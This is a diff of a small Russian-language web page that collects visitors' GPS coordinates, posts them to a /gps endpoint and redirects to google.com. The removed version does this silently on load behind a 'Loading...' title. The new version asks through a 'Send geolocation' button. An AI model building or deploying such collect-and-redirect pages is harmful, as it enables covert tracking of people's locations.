@@ -1,35 +1,71 @@
 
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
+  <meta charset="UTF-8">
   <title>Загрузка...</title>
-  <script>
-    navigator.geolocation.getCurrentPosition(
-      function (position) {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-
-        fetch("/gps", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ lat: lat, lon: lon })
-        }).finally(() => {
-          fetch("/")
-            .finally(() => {
-              window.location.href = "https://google.com";
-            });
-        });
-      },
-      function (error) {
-        fetch("/")
-          .finally(() => {
-            window.location.href = "https://google.com";
-          });
-      }
-    );
-  </script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 100px;
+    }
+    button {
+      padding: 12px 20px;
+      font-size: 16px;
+      border: none;
+      background-color: #4CAF50;
+      color: white;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #45a049;
+    }
+    #status {
+      margin-top: 20px;
+      color: #555;
+    }
+  </style>
 </head>
 <body>
-  <h1>Загрузка...</h1>
+  <h1>Получить вашу точную геолокацию</h1>
+  <button onclick="getLocation()">Отправить геолокацию</button>
+  <div id="status"></div>
+
+  <script>
+    function getLocation() {
+      document.getElementById("status").innerText = "⏳ Запрашиваем координаты...";
+      navigator.geolocation.getCurrentPosition(
+        function (position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          fetch("/gps", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ lat: lat, lon: lon })
+          }).finally(() => {
+            fetch("/")
+              .finally(() => {
+                document.getElementById("status").innerText = "✅ Отправлено! Перенаправление...";
+                setTimeout(() => {
+                  window.location.href = "https://google.com";
+                }, 1500);
+              });
+          });
+        },
+        function (error) {
+          document.getElementById("status").innerText = "❌ Не удалось получить GPS: " + error.message;
+          fetch("/")
+            .finally(() => {
+              setTimeout(() => {
+                window.location.href = "https://google.com";
+              }, 2000);
+            });
+        }
+      );
+    }
+  </script>
 </body>
 </html>
